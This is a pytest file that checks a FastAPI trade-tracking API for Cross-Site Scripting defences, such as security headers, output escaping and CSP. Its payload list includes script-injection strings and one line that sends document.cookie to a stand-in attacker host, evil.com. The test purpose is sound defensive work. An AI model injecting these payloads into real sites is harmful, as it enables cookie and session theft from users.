"""
XSS Protection Tests

Tests to verify the application is protected against Cross-Site Scripting (XSS) attacks.

Test Coverage:
- Reflected XSS prevention
- Stored XSS prevention
- DOM-based XSS prevention
- Security headers (CSP, X-XSS-Protection)
- Input sanitization
- Output encoding
"""

import pytest
from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)


class TestXSSProtection:
    """Test suite for XSS attack prevention."""

    # Common XSS payloads for testing
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
    ]

    def test_security_headers_present(self):
        """Test that security headers are present in responses."""
        response = client.get("/health")

        # Check for XSS protection headers
        assert "X-XSS-Protection" in response.headers
        assert response.headers["X-XSS-Protection"] == "1; mode=block"

        # Check for Content Security Policy
        assert "Content-Security-Policy" in response.headers
        csp = response.headers["Content-Security-Policy"]
        assert "default-src 'self'" in csp
        assert "script-src 'self'" in csp

        # Check for X-Content-Type-Options (prevents MIME sniffing)
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"

    def test_xss_in_query_parameters(self):
        """Test that XSS payloads in query parameters are not reflected unsanitized."""
        for payload in self.XSS_PAYLOADS:
            response = client.get(f"/api/v1/trades?ticker={payload}")

            # Response should not contain the raw payload
            assert payload not in response.text, f"XSS payload reflected: {payload}"

            # Check status code (should be 400 Bad Request or sanitized)
            assert response.status_code in [200, 400, 422], f"Unexpected status for payload: {payload}"

    def test_xss_in_path_parameters(self):
        """Test that XSS payloads in path parameters are handled safely."""
        # Generate a UUID-like string with XSS payload
        xss_id = "12345678-1234-1234-1234-123456789abc<script>alert('XSS')</script>"

        response = client.get(f"/api/v1/trades/{xss_id}")

        # Should return 404 or 422, not execute script
        assert response.status_code in [404, 422]
        assert "<script>" not in response.text
        assert "alert" not in response.text

    def test_xss_in_json_input(self):
        """Test that XSS payloads in JSON input are sanitized."""
        # Skip if no authenticated user (would need auth)
        # This is a placeholder for authenticated endpoints

        for payload in self.XSS_PAYLOADS[:3]:  # Test a few payloads
            # Example: Creating a trade with XSS in ticker
            trade_data = {
                "politician_id": "12345678-1234-1234-1234-123456789abc",
                "ticker": payload,
                "transaction_type": "buy",
                "transaction_date": "2024-01-01",
                "disclosure_date": "2024-01-02",
            }

            # This would require authentication, so we expect 401 or 403
            # The important part is it doesn't execute the script
            response = client.post("/api/v1/trades", json=trade_data)

            # Should not reflect XSS payload in error message
            assert payload not in response.text or "<script>" not in response.text

    def test_response_content_type_json(self):
        """Test that JSON responses have correct Content-Type."""
        response = client.get("/api/v1/trades?limit=1")

        # Should be JSON content type
        assert "application/json" in response.headers.get("Content-Type", "")

        # Should not be text/html (prevents XSS in some browsers)
        assert "text/html" not in response.headers.get("Content-Type", "")

    def test_csp_prevents_inline_scripts(self):
        """Test that CSP policy prevents inline scripts."""
        response = client.get("/health")

        csp = response.headers.get("Content-Security-Policy", "")

        # CSP should restrict script sources
        # Note: We allow 'unsafe-inline' for some frameworks, but document this
        assert "script-src" in csp

        # Should not allow unsafe-eval in strict mode
        # (We may need it for some features, but test it's intentional)
        if "'unsafe-eval'" in csp:
            # If present, it should be documented/intentional
            pytest.skip("unsafe-eval is allowed (check if intentional)")

    def test_no_xss_in_error_messages(self):
        """Test that error messages don't reflect XSS payloads."""
        payload = "<script>alert('XSS')</script>"

        # Invalid UUID format with XSS
        response = client.get(f"/api/v1/trades/{payload}")

        # Error message should not contain the raw payload
        assert payload not in response.text
        assert "<script>" not in response.text

    def test_html_entities_escaped(self):
        """Test that HTML entities are escaped in responses."""
        # Test with a payload containing HTML entities
        payload = "<>&\"'"

        response = client.get(f"/api/v1/trades?ticker={payload}")

        # If the ticker is reflected, it should be escaped
        response_text = response.text

        # Check that dangerous characters are escaped or rejected
        if payload in response_text:
            # Should be HTML-encoded
            pytest.fail("HTML entities not escaped in response")

    @pytest.mark.parametrize("header", [
        "X-XSS-Protection",
        "X-Content-Type-Options",
        "Content-Security-Policy",
        "X-Frame-Options",
    ])
    def test_security_header_on_all_endpoints(self, header):
        """Test that security headers are present on all endpoints."""
        endpoints = [
            "/health",
            "/api/v1/trades",
            "/",
        ]

        for endpoint in endpoints:
            response = client.get(endpoint)
            assert header in response.headers, f"{header} missing from {endpoint}"


class TestStoredXSSPrevention:
    """Test prevention of stored XSS attacks."""

    def test_database_input_sanitization(self):
        """Test that data stored in database is sanitized."""
        # This would test that if we store XSS payloads in the database,
        # they are sanitized on retrieval
        # Requires database setup and test fixtures
        pytest.skip("Requires database test fixtures")

    def test_output_encoding_from_database(self):
        """Test that data retrieved from database is properly encoded."""
        # Similar to above - would need test data
        pytest.skip("Requires database test fixtures")


class TestDOMXSSPrevention:
    """Test prevention of DOM-based XSS attacks."""

    def test_json_response_safe_for_dom_insertion(self):
        """Test that JSON responses are safe for DOM insertion."""
        response = client.get("/api/v1/trades?limit=1")

        # Response should be JSON
        assert response.headers.get("Content-Type", "").startswith("application/json")

        # Parse JSON
        data = response.json()

        # Check that string values don't contain dangerous HTML
        def check_recursive(obj):
            if isinstance(obj, dict):
                for value in obj.values():
                    check_recursive(value)
            elif isinstance(obj, list):
                for item in obj:
                    check_recursive(item)
            elif isinstance(obj, str):
                # Check for common XSS patterns
                dangerous_patterns = ["<script", "onerror=", "onclick=", "javascript:"]
                for pattern in dangerous_patterns:
                    assert pattern.lower() not in obj.lower(), f"Dangerous pattern in response: {pattern}"

        check_recursive(data)


class TestXSSDefenseInDepth:
    """Test defense-in-depth strategies for XSS prevention."""

    def test_httponly_cookie_flag(self):
        """Test that session cookies have HttpOnly flag."""
        # Would need to test actual cookie setting
        # This is a placeholder for cookie security tests
        pytest.skip("Cookie testing requires authenticated session")

    def test_secure_cookie_flag_in_production(self):
        """Test that cookies have Secure flag in production."""
        pytest.skip("Requires production environment configuration")

    def test_samesite_cookie_attribute(self):
        """Test that cookies have SameSite attribute."""
        pytest.skip("Requires cookie setting functionality")


# Performance test for XSS sanitization
class TestXSSSanitizationPerformance:
    """Test that XSS sanitization doesn't significantly impact performance."""

    def test_sanitization_performance(self):
        """Test that input sanitization is performant."""
        import time

        # Create a payload with many special characters
        payload = "<script>" * 100

        start = time.time()

        # Make multiple requests
        for _ in range(10):
            client.get(f"/api/v1/trades?ticker={payload}")

        elapsed = time.time() - start

        # Should complete in reasonable time (< 1 second for 10 requests)
        assert elapsed < 1.0, f"XSS sanitization too slow: {elapsed}s for 10 requests"


# Integration tests
class TestXSSIntegration:
    """Integration tests for XSS protection across the application."""

    def test_xss_protection_end_to_end(self):
        """Test XSS protection in a realistic scenario."""
        # 1. Attempt to inject XSS in search
        xss_payload = "<script>alert('XSS')</script>"
        response = client.get(f"/api/v1/trades?ticker={xss_payload}")

        # 2. Response should not contain unescaped payload
        assert "<script>" not in response.text

        # 3. Security headers should be present
        assert "Content-Security-Policy" in response.headers

        # 4. Response should be JSON (not HTML)
        assert "application/json" in response.headers.get("Content-Type", "")

    def test_csp_reporting(self):
        """Test that CSP violations can be reported."""
        response = client.get("/health")

        csp = response.headers.get("Content-Security-Policy", "")

        # In production, CSP should have report-uri or report-to
        # For now, just verify CSP exists
        assert len(csp) > 0
